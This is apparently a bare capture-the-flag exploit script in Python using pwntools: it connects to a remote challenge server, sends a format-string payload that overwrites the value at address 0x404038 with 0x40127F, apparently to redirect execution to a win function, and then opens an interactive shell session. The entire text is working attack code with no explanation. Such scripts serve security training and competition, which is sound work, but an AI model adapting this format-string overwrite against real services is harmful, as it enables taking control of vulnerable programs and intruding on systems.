from pwn import *
io=remote("nc1.ctfplus.cn",48211)
context.arch='amd64'

payload=fmtstr_payload(8,{0x404038:0x40127F})

io.sendline(payload)

io.interactive()